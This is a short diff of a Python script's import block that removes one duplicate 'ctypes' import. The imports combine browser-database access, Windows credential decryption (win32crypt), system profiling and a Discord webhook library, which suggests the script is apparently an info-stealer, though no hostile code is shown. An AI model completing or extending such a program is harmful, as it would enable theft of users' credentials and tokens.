@@ -1,4 +1,4 @@
-import sqlite3, ctypes, sys, ctypes, winreg
+import sqlite3, ctypes, sys, winreg
 import os, wmi, win32api, platform, psutil, time, GPUtil
 import shutil, pythoncom
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
